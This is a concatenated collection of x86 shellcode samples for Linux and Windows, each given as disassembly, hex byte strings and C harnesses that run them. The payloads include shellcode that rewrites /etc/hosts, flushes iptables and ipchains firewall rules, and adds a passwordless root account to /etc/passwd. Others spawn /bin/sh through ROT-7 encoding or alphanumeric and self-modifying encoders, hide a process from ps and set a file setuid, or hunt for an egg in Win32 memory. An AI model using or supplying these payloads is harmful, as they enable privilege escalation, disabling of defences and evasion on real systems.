 14a:   68 76 50 2e 73          push   $0x732e5076
 14f:   68 4e 58 52 37          push   $0x3752584e
 154:   68 39 4b 55 48          push   $0x48554b39
 159:   68 72 2f 59 42          push   $0x42592f72
 15e:   68 56 78 4b 47          push   $0x474b7856
 163:   68 39 55 66 5a          push   $0x5a665539
 168:   68 46 56 6a 68          push   $0x686a5646
 16d:   68 46 63 38 79          push   $0x79386346
 172:   68 70 59 6a 71          push   $0x716a5970
 177:   68 77 69 53 68          push   $0x68536977
 17c:   68 6e 54 67 54          push   $0x5467546e
 181:   68 58 4d 69 37          push   $0x37694d58
 186:   68 2f 41 6e 24          push   $0x246e412f
 18b:   68 70 55 6e 4d          push   $0x4d6e5570
 190:   68 24 36 24 6a          push   $0x6a243624
 195:   b9 73 61 74 67          mov    $0x67746173,%ecx
 19a:   ba 32 2d 3d 5d          mov    $0x5d3d2d32,%edx
 19f:   31 d1                   xor    %edx,%ecx
 1a1:   51                      push   %ecx
 1a2:   89 e1                   mov    %esp,%ecx
 1a4:   ba 41 41 41 7f          mov    $0x7f414141,%edx
 1a9:   c1 ea 08                shr    $0x8,%edx
 1ac:   c1 ea 08                shr    $0x8,%edx
 1af:   c1 ea 08                shr    $0x8,%edx
 1b2:   cd 80                   int    $0x80
 1b4:   31 c0                   xor    %eax,%eax
 1b6:   b0 46                   mov    $0x46,%al
 1b8:   31 db                   xor    %ebx,%ebx
 1ba:   31 c9                   xor    %ecx,%ecx
 1bc:   cd 80                   int    $0x80
 1be:   31 c0                   xor    %eax,%eax
 1c0:   b0 46                   mov    $0x46,%al
 1c2:   31 db                   xor    %ebx,%ebx
 1c4:   31 c9                   xor    %ecx,%ecx
 1c6:   cd 80                   int    $0x80
 1c8:   68 52 55 48 42          push   $0x42485552
 1cd:   68 52 51 49 43          push   $0x43495152
 1d2:   b9 49 4b 59 77          mov    $0x77594b49,%ecx
 1d7:   ba 66 38 31 35          mov    $0x35313866,%edx
 1dc:   31 d1                   xor    %edx,%ecx
 1de:   51                      push   %ecx
 1df:   b9 55 55 54 57          mov    $0x57545555,%ecx
 1e4:   ba 7a 37 3d 39          mov    $0x393d377a,%edx
 1e9:   31 d1                   xor    %edx,%ecx
 1eb:   51                      push   %ecx
 1ec:   89 e3                   mov    %esp,%ebx
 1ee:   31 c0                   xor    %eax,%eax
 1f0:   88 43 07                mov    %al,0x7(%ebx)
 1f3:   89 5b 08                mov    %ebx,0x8(%ebx)
 1f6:   89 43 0c                mov    %eax,0xc(%ebx)
 1f9:   b0 0b                   mov    $0xb,%al
 1fb:   8d 4b 08                lea    0x8(%ebx),%ecx
 1fe:   8d 53 0c                lea    0xc(%ebx),%edx
 201:   cd 80                   int    $0x80
 203:   b0 01                   mov    $0x1,%al
 205:   b3 01                   mov    $0x1,%bl
 207:   cd 80                   int    $0x80
root@user:~/Desktop/xpl#



*/

#include <stdio.h>
#include <string.h>
char sc[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xbb\x59\x45\x4f\x53\xba\x33\x36\x38\x37\x31\xd3\x53\xc1\xeb\x08\x53\xbb\x7a\x46\x59\x45\xba\x55\x36\x38\x36\x31\xd3\x53\xbb\x67\x58\x45\x4e\xba\x48\x3d\x31\x2d\x31\xd3\x53\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x0f\x58\xcd\x80\xbb\x53\x49\x57\x4a\xba\x39\x2d\x38\x3d\x31\xd3\xc1\xeb\x08\x53\xbb\x6d\x47\x45\x58\xba\x42\x34\x2d\x39\x31\xd3\x53\xbb\x6e\x54\x49\x57\xba\x41\x31\x3d\x34\x31\xd3\x53\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x0f\x58\xcd\x80\xbb\x73\x47\x4e\x51\xba\x32\x34\x39\x35\x31\xd3\xc1\xeb\x08\x53\xbb\x59\x44\x56\x44\xba\x76\x34\x37\x37\x31\xd3\x53\xbb\x4e\x58\x59\x51\xba\x61\x3d\x2d\x32\x31\xd3\x53\x89\xe3\x68\x41\x41\x01\x04\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x05\x58\xcd\x80\x89\xc3\x6a\x04\x58\x68\x41\x73\x68\x0a\x59\xc1\xe9\x08\x51\xb9\x57\x67\x57\x58\xba\x39\x48\x35\x39\x31\xd1\x51\xb9\x4e\x64\x5a\x51\xba\x74\x4b\x38\x38\x31\xd1\x51\xb9\x47\x57\x56\x42\xba\x35\x38\x39\x36\x31\xd1\x51\xb9\x61\x70\x51\x4e\xba\x2d\x39\x6b\x61\x31\xd1\x51\xb9\x48\x58\x70\x74\xba\x72\x68\x4a\x35\x31\xd1\x51\xb9\x76\x45\x56\x46\xba\x3d\x6b\x6c\x76\x31\xd1\x51\x68\x66\x77\x55\x57\x68\x68\x70\x31\x50\x68\x7a\x59\x65\x41\x68\x41\x61\x41\x51\x68\x49\x38\x75\x74\x68\x50\x4d\x59\x68\x68\x54\x42\x74\x7a\x68\x51\x2f\x38\x54\x68\x45\x36\x6d\x67\x68\x76\x50\x2e\x73\x68\x4e\x58\x52\x37\x68\x39\x4b\x55\x48\x68\x72\x2f\x59\x42\x68\x56\x78\x4b\x47\x68\x39\x55\x66\x5a\x68\x46\x56\x6a\x68\x68\x46\x63\x38\x79\x68\x70\x59\x6a\x71\x68\x77\x69\x53\x68\x68\x6e\x54\x67\x54\x68\x58\x4d\x69\x37\x68\x2f\x41\x6e\x24\x68\x70\x55\x6e\x4d\x68\x24\x36\x24\x6a\xb9\x73\x61\x74\x67\xba\x32\x2d\x3d\x5d\x31\xd1\x51\x89\xe1\xba\x41\x41\x41\x7f\xc1\xea\x08\xc1\xea\x08\xc1\xea\x08\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x52\x55\x48\x42\x68\x52\x51\x49\x43\xb9\x49\x4b\x59\x77\xba\x66\x38\x31\x35\x31\xd1\x51\xb9\x55\x55\x54\x57\xba\x7a\x37\x3d\x39\x31\xd1\x51\x89\xe3\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
int main(void)
{

    fprintf(stdout,"Length: %d\n\n",strlen(sc));

    (*(void(*)()) sc)();

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**

;modify_hosts.asm
;this program add a new entry in hosts file pointing google.com to 127.1.1.1 
;author Javier Tejedor
;date 24/09/2014

global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80        ;syscall to close the file

    push 0x1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 ROT-7 Decoder Shellcode - Linux Intel/x86
 Author: Stavros Metzidakis

*/


a) Python ROT-7 encoder for shellcode (execve-stack)
---------------------------------------------------------------------------------------
#!/usr/bin/python

# Python ROT-7 Encoder

shellcode = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
# boundary is computed as 255-ROT(x) where x, the amount to rotate by
    if x > 248:
        encoded += '\\x'
        encoded += '%02x' %(7 -(256 - x))
        encoded2 += '0x'
        encoded2 += '%02x,' %(7 -(256 - x))
    else:
        encoded += '\\x'
        encoded += '%02x'%(x+7)
        encoded2 += '0x'
        encoded2 += '%02x,' %(x+7)
    

print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
---------------------------------------------------------------------------------------
Test run:
$ ./rot-7-encoder.py
Encoded shellcode ...
\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87
0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87,
Len: 30




b) Decoder for a ROT-7 encoded shellcode (execve-stack)
---------------------------------------------------------------------------------------
$objdump -d rot-7-decoder -M intel 

rot-7-decoder:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:   eb 25                   jmp    8048087 <call_decoder>

08048062 <decoder>:
 8048062:   5e                      pop    esi
 8048063:   31 c9                   xor    ecx,ecx
 8048065:   b1 1e                   mov    cl,0x1e              ;ROTed shellcode length goes here

08048067 <decode>:
 8048067:   80 3e 07                cmp    BYTE PTR [esi],0x7
 804806a:   7c 05                   jl     8048071 <lowbound>
 804806c:   80 2e 07                sub    BYTE PTR [esi],0x7
 804806f:   eb 11                   jmp    8048082 <common_commands>

08048071 <lowbound>:
 8048071:   31 db                   xor    ebx,ebx
 8048073:   31 d2                   xor    edx,edx
 8048075:   b3 07                   mov    bl,0x7
 8048077:   b2 ff                   mov    dl,0xff
 8048079:   66 42                   inc    dx
 804807b:   2a 1e                   sub    bl,BYTE PTR [esi]
 804807d:   66 29 da                sub    dx,bx
 8048080:   88 16                   mov    BYTE PTR [esi],dl

08048082 <common_commands>:
 8048082:   46                      inc    esi
 8048083:   e2 e2                   loop   8048067 <decode>
 8048085:   eb 05                   jmp    804808c <Shellcode>

08048087 <call_decoder>:
 8048087:   e8 d6 ff ff ff          call   8048062 <decoder>

0804808c <Shellcode>:                               ;ROTed shellcode
 804808c:   38 c7                   cmp    bh,al
 804808e:   57                      push   edi
 804808f:   6f                      outs   dx,DWORD PTR ds:[esi]
 8048090:   69 68 7a 6f 6f 69 70    imul   ebp,DWORD PTR [eax+0x7a],0x70696f6f
 8048097:   75 36                   jne    80480cf <Shellcode+0x43>
 8048099:   6f                      outs   dx,DWORD PTR ds:[esi]
 804809a:   36                      ss
 804809b:   36                      ss
 804809c:   36                      ss
 804809d:   36                      ss
 804809e:   90                      nop
 804809f:   ea 57 90 e9 5a 90 e8    jmp    0xe890:0x5ae99057
 80480a6:   b7 12                   mov    bh,0x12
 80480a8:   d4 87                   aam    0x87
---------------------------------------------------------------------------------------


$ cat shellcode.c

#include <stdio.h>
#include <string.h>

unsigned char code[] = "\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87";

main()
{

    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}


$ gcc ./shellcode.c -fno-stack-protector -z execstack -o shellcode
$ ./shellcode
Shellcode Length:  74
$ 




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

; win32 eggsearch shellcode, 33 bytes
; tested on windows xp sp2, should work on all service packs on win2k, win xp, win2k3
; (c) 2009 by Georg 'oxff' Wicherski
 
[bits 32]
 
marker equ 0x1f217767   ; 'gw!\x1f'
 
start:
 xor edx, edx   ; edx = 0, pointer to examined address
 
address_loop:
 inc edx    ; edx++, try next address
 
pagestart_check:
 test dx, 0x0ffc   ; are we within the first 4 bytes of a page?
 jz address_loop   ; if so, try next address as previous page might be unreadable
     ; and the cmp [edx-4], marker might result in a segmentation fault
 
access_check:
 push edx   ; save across syscall
 push byte 8   ; eax = 8, syscall nr of AddAtomA
 pop eax    ; ^
 int 0x2e   ; fire syscall (eax = 8, edx = ptr)
 cmp al, 0x05   ; is result 0xc0000005? (a bit sloppy)
 pop edx    ;
 
 je address_loop   ; jmp if result was 0xc0000005
 
egg_check:
 cmp dword [edx-4], marker ; is our egg right before examined address?
 jne address_loop  ; if not, try next address
 
egg_execute:
 inc ebx    ; make sure, zf is not set
 jmp edx    ; we found our egg at [edx-4], so we can jmp to edx



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



The comment in that file is not correct.. I cut and pasted the shell code
in an existing c source and forgot to adjust it..

/*
 * This shellcode will do a mkdir() of 'hacked' and then an exit()
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed"
        "\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68"
        "\x61\x63\x6b\x65\x64\x23";


void main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


Author: zillion
Email: zillion@safemode.org
Home: http://www.safemode.org

Linux x86 shellcode that does an execve() of /sbin/iptables -F in order to
flush activated firewall rules.


File: flush-iptables-shell.c

/*
 * This shellcode will do /sbin/iptables -F
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d"
        "\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12"
        "\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x73\x62\x69\x6e"
        "\x2f\x69\x70\x74\x61\x62\x6c\x65\x73\x38\x2d\x46\x32\x33\x34"
        "\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65";


int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}


-- 





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


Author: zillion
Email: zillion@safemode.org
Homepage: http://www.safemode.org


Linux x86 shell code that does an execve of /sbin/ipchains -F


File name: flush-ipchains-shellcode.c


/*
 * This shellcode will do /sbin/ipchains -F
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d"
        "\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12"
        "\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x73\x62\x69\x6e"
        "\x2f\x69\x70\x63\x68\x61\x69\x6e\x73\x38\x2d\x46\x32\x33\x34"
        "\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65";


int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}

-- 





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


Author: zillion
EMail: zillion@safemode.org
Home: http://www.safemode.org


Linux x86 shellcode that does an execve of /bin/sh /tmp/p00p.


File name: execve-tmp-p00p.c


/*
 * This shellcode will do /bin/sh /tmp/p00p ;-)
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x21\x5e\x31\xc0\x88\x46\x07\x88\x46\x11\x89\x76\x12\x8d"
        "\x5e\x08\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12"
        "\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x62\x69\x6e\x2f"
        "\x73\x68\x38\x2f\x74\x6d\x70\x2f\x70\x30\x30\x70\x32\x33\x34"
        "\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65";

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}


-- 




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



Linux x86 shellcode that uses execve and echo >> to create a passwordless
root account.


Author: zillion
Email : zillion@safemode.org
Homepage: safemode.org
File: w000t-shell.c



/*
 * This shellcode will add a passwordless local root account 'w000t'
 * Written by zillion@safemode.org
 *
 * Why so big ? it uses execve ;-)
 */

char shellcode[]=
        "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x47\x89"
        "\x76\x49\x8d\x5e\x08\x89\x5e\x4d\x8d\x5e\x0b\x89\x5e\x51\x89"
        "\x46\x55\xb0\x0b\x89\xf3\x8d\x4e\x49\x8d\x56\x55\xcd\x80\xe8"
        "\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x2d\x63\x23"
        "\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x77\x30\x30\x30\x74"
        "\x3a\x3a\x30\x3a\x30\x3a\x73\x34\x66\x65\x6d\x30\x64\x65\x3a"
        "\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
        "\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
        "\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44"
        "\x44\x44";



int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}


-- 





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#=============================================================================================#
# hide-wait-change (final v4)                                                                 #
# ------------------------------------------------------------------------------------------- #
#      Author: xort (rrs@clyde.dcccd.edu)                                                     #
#        Date: 09/14/2005 3:35pm                                                              # 
#        Type: shellcode/(x86-linux).s,   (at&t)                                              #
#        Size: strlen(fake-proc-name) + strlen(file-to-change) + 187                          #
# Discription: This is a shellcode that will infect a process, play some argv[0] games among  #
#              other tricks to hide itself from 'ps', and waits until the creation of a       #
#              specified file. Once this file is found to exist, its permissions are changed  #
#              to 04555. Original concept concived by izik.                                   #
###############################################################################################

.section .text

	.global _start

        ###################################################################################
        ##                                                                               ##
        ## _start: 1) fork() a new process                                               ##
        ##         2) check to see if we are child process                               ##
        ##         3) if we are then _exit()                                             ##
        ##                                                                               ##
        ###################################################################################


	_start:


	      #-------------------------------------------#
	      # we start with a fork()                    #
	      #-------------------------------------------#
                 
	      push $0x02
              pop %eax	
              int $0x80
		
                
	      #-------------------------------------------#
	      # child or parent?                          #
	      #-------------------------------------------#
		
	      test %eax, %eax
	      je proc_name
	

	      #-------------------------------------------#
	      # parent goes exit()                        #
	      #-------------------------------------------#

	      push $0x01
              pop %eax 
	      int $0x80  
             

        ###################################################################################
        ##                                                                               ##
        ##         1) get address of "/proc/self/stat" and fix null@end                  ##
        ##         2) open() "/proc/self/stat"                                           ##
        ##         3) read in 250 bytes from file                                        ##
        ##                                                                               ##
        ###################################################################################


              #-------------------------------------------#             
              # grab "/proc" string location              #
              #-------------------------------------------#

 ret_w_proc:  pop %ebx
              lea 0x10(%ebx), %esi              

              #-------------------------------------------#
	      # fix "/proc" string to include c-string    #
	      # terminator                                #
	      #-------------------------------------------#
	      
              incb 0xf(%ebx)


	###################################################################################
        ##                                                                               ##
        ## Open "/proc/self/stat" and read in 250 bytes                                  ##
        ##                                                                               ##
        ###################################################################################


              #-------------------------------------------#
	      # open() the file                           #
	      #-------------------------------------------#
	      
	      cdq 
	      xor %ecx, %ecx
              movb $0x5, %al
              int $0x80
	      	      

	      #------------------------------------------#
	      # read() 250-bytes from the file into      #
	      # ESP-250                                  #
	      #------------------------------------------#
	      
	      xchg %eax, %ebx # store fd-pointer in ebx
	      push $0x3
              pop %eax
	      movb $250, %dl      
	      mov %esp, %ecx              
	      sub %edx, %ecx
              int $0x80  
	      
	      mov %ecx, %edi
              add %eax, %edi
	      

	###################################################################################
        ##                                                                               ##
        ##      1) Get location of pointer to argv[0] from file (NF-13)                  ## 
        ##      2) Convert it to binary                                                  ##
        ##      3) use that to find real argv[0]s location                               ##
        ##      4) null-out all args with 0x0                                            ##
        ##                                                                               ##
	###################################################################################


	      #------------------------------------------#
	      # scan for the decimal-string of the       #
	      # location of argc & argv[0]               #
	      #------------------------------------------#	      
	      
	      xchg %eax, %ebx
	      
              std
	      push $0x20
              pop %eax
	      push $14
              pop %ecx
	     
  findargs:
              xchg %ecx, %ebx      
	      repne scasb
	      xchg %ecx, %ebx
	      loop findargs
	      inc %edi
	      inc %edi
	      

	      #------------------------------------------#
	      # translate string into a real number to   #
	      # obtain pointer.                          #
	      #------------------------------------------#

              xor %eax, %eax
	      push $10
              pop %ebx
              cld 

 calcloop: 
              xor %edx, %edx
              movb (%edi), %cl
              subl $0x30, %ecx
              addl %ecx, %eax
              inc %edi
              cmpb $0x20, (%edi) 
              je done_gotnum
              mul %ebx
              jmp calcloop 


              #------------------------------------------#
              # once we have the location in memory of   #
              # pointers to argc,argv[0-?], and envp,    #
              # extract the location of argv[0]          #
              #------------------------------------------#

 done_gotnum:
              xchg %eax, %esp
	      pop %edi          
	      pop %edi
	      xchg %eax, %esp


              #------------------------------------------#
              # write 255 null characters past argv[0]   #
              # to overwrite it and any other args so ps #
              # wont see them later                      #
              #------------------------------------------#

              push %edi
              movb $0xff, %cl
              xor %eax, %eax
              rep stosb
              pop %edi



	###################################################################################
        ##                                                                               ##
        ##      1) Get location of string we are going to copy over argv[0] and fix      ## 
        ##         null@end.                                                             ##
        ##      2) Call setsid() to extablish us as a process leader.                    ##
        ##      3) Jump over strings into shellcode.                                     ##
        ##                                                                               ##
	###################################################################################


              #------------------------------------------#
              # Get string location, fix nullchar and    #
              # copy over argv[0],                       #
              #------------------------------------------#


              push %esi
              dec %esi
 findend:
              inc %esi
              inc %ecx
              cmpb $0xff, (%esi)
              jne findend

              incb (%esi)
              pop %esi               
	      rep movsb


              #------------------------------------------#
              # Call setsid() to establish us as a       #
              # process leader.                          #
              #------------------------------------------#

              movb $66, %al
              int $0x80

              mov %esi, %edi
              xchg %eax, %edx

              dec %eax
              mov %eax, %ecx 
              repne scasb
               
              incb -1(%edi)


              #------------------------------------------#
              # Jump over strings into shellcode         #
              #------------------------------------------#

              jmp *%edi


	###################################################################################
        ##     STRINGS                                                                   ##
	###################################################################################


	proc_name:
		call ret_w_proc
		.ascii "/proc/self/stat\xff"
	
   replace_string:
		.ascii "haha\xff"

         filename:
                .ascii "/tmp/foo\xff"


	###################################################################################
        #                                                                                 #
        # SHELLCODE                                                                       #
        #          1) call nanosleep(60)                                                  #
        #          2) check to see if FILENAME exist w/ access()                          #
        #          3) if it does, then chmod 04555 FILENAME and exit                      #
        #          4) _exit()                                                             #
        #                                                                                 #
	###################################################################################

       shellcode:
                push $60

    checkforfile:
                inc %eax

              #------------------------------------------#
              # nanosleep(%edi)                          #
              #------------------------------------------#
                mov %esp, %ecx
                mov %esp, %ecx
                mov %esp, %ebx
                xorb $0xa2, %al
                int $0x80


              #------------------------------------------#
              # access((%esi),0)                         #
              #------------------------------------------#

                xor %ecx, %ecx
                mov %esi, %ebx
                xorb $0x21, %al
                int $0x80

                test %eax, %eax
                jne checkforfile 


              #------------------------------------------#
              # chmod((%esi),04555)                      #
              #------------------------------------------#

                movb $0xf, %al
                movw $0x96d, %cx 
                int $0x80 


              #------------------------------------------#
              # _exit()                                  #
              #------------------------------------------#

                inc %eax
                int $0x80 






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

     /*--------------------------------------*/
     /*   64 byte alpha-numeric shellcode    */
     /*        by XORt@dallas_2600   64bytes */
     /*--------------------------------------*/
     "\x6a\x30"         /* pushb $0x30       */
     "\x58"             /* pop %eax          */
     "\x34\x30"         /* xorb $0x30, %al   */
     "\x50"             /* push %eax         */
     "\x5a"             /* pop %edx          */
     "\x48"             /* dec %eax          */
     "\x66\x35\x41\x30" /* xorl $0x3041, %ax */
     "\x66\x35\x73\x4f" /* xorl $0x4f73, %ax */ 
     "\x50"             /* push %eax         */
     "\x52"             /* pushl %edx        */
     "\x58"             /* pop %eax          */
     "\x684J4A"         /* pushl "4J4A"      */
     "\x68PSTY"         /* pushl "PSTY"      */
     "\x68UVWa"         /* pushl "UVWa"      */
     "\x68QRPT"         /* pushl "QRPT"      */
     "\x68PTXR"         /* pushl "PTXR"      */
     "\x68binH"         /* pushl "binH"      */
     "\x68IQ50"         /* pushl "IQ50"      */
     "\x68shDY"         /* pushl "shDY"      */
     "\x68Rha0"         /* pushl "Rha0"      */
     /*--------------------------------------*/






////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*-------------------------------------------------------*/
/*     Radically Self Modifying Code for surviving       */
/*            toupper() and tolower()                    */
/*                                                       */
/*         70byte execve & _exit() code by XORt          */
/*-------------------------------------------------------*/
"\xeb\x12"                 /* jmp $0x12                  */
"\x5e"                     /* pop %esi                   */
/*-set-up-loop-counter-and-ajust-shellcode-pointer-------*/
"\x31\xc9"                 /* xor %ecx, %ecx             */
"\xb1\x0b"                 /* mov $0xb, %cl              */
"\xff\xc6"                 /* inc %esi                   */
/*-the-loop----------------------------------------------*/
"\x81\x06\x5b\x2d\xd0\xcb" /* addl $0xcbd02d5b, (%esi)   */
"\xad"                     /* lodsl                      */
"\xe2\xf7"                 /* loop -$0x9                 */
/*--jump-into-shellcode----------------------------------*/
"\xeb\x05"                 /* jmp $0x5                   */
"\xe8\xe9\xff\xff\xff"     /* call -$0x17                */
/*--------------------------------------------[bytes:25]-*/
//                                                       //
/*--the-shellcode----------------------------------------*/
"\xeb"                     /* --then encoded shellcode-- */
"\xc4\x30\xb9\xaa"         /*                            */
"\xad\x03\xf0\xbc"         /*                            */
"\xeb\xd9\xb8\x7a"         /*                            */
"\xb1\x82\x3b\xbd"         /*                            */
"\x98\x60\x7e\x3c"         /*                            */
"\x32\x29\x3c\x01"         /*                            */
"\x25\x04\x0b\xbe"         /*                            */
"\x7d\x13\xfd\xb4"         /*                            */
"\x8d\xaf\x2f\x34"         /*                            */
"\xa4\x02\x92\x9d"         /*                            */
"\x13\x02\xa3\x9c";        /*                            */
/*--------------------------------------------[bytes:45]-*/





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*-------------------------------------------------------*/
/*     Magic Byte Self Modifying Code for surviving      */
/*               toupper() & tolower()                   */
/*        76bytes execve() _exit() code by XORt          */
/*-------------------------------------------------------*/
"\xeb\x34"               /* jmp $0x34          [revert]  */
"\x5e"                   /* pop %esi                     */
/*--set-up-variables-------------------------------------*/
"\x89\xf7"               /* mov %esi, %edi               */
"\x83\xef\x22"           /* sub $0x22, %edi              */
"\x31\xc9"               /* xor %ecx, %ecx               */
"\xb1\x8c"               /* mov $0x8c, %cl               */
"\xd1\xc9"               /* ror $0x1, %ecx    (70loops)  */
/*-scan-for-magic-byte-----------------------------------*/
"\xb0\x7b"               /* mov $0x7b, %al               */
"\xf2\xae"               /* repne scasb                  */
"\xff\xcf"               /* dec %edi                     */
"\xac"                   /* lodsb            (al=DS:SI)  */
"\x28\x07"               /* subb %al, (%edi)             */
/*--loop-back-to-scanner---------------------------------*/
"\xe2\xf5"               /* loop -$0xe      [load-byte]  */
/*-------------------------------------[length:25bytes]--*/
//                                                       //
/*--modified-shellcode-----------------------------------*/
"\x89\x7b\x08"           /* movl %esi, 0x8(%esi)        @*/
"\x91"                   /* xchg %eax, %ecx              */
"\x88\x7b\x07"           /* movb %al, 0x7(%esi)         @*/
"\x89\x7b\x0c"           /* movl %eax, 0xc(%esi)        @*/
"\xb0\x0b"               /* movb $0xb, %al               */
"\x89\xf3"               /* movl %esi, %ebx              */
"\x8d\x7b\x08"           /* leal 0x8(%esi), %ecx        @*/
"\x8d\x7b\x0c"           /* leal 0xc(%esi), %edx        @*/
"\xcd\x80"               /* int $0x80                    */
"\x31\xdb"               /* xorl %ebx, %ebx              */
"\x89\xd8"               /* movl %ebx, %eax              */
"\x40"                   /* inc %eax                     */
"\xcd\x80"               /* int $0x80                    */
/*--revert-----------------------------------------------*/
"\xe8\xc7\xff\xff\xff"   /* call -$0x39                  */
/*--offset-table-----------------------------------------*/
"\x05\x35\x35\x2d\x25\x19\x12\x0d\x08\x13"             /**/
/*--string-to-run----------------------------------------*/
"/\x7b\x7b\x7b/\x7b\x7b" /* .string "/bin/sh"            */
/*--------------------------------------[length:51bytes]-*/






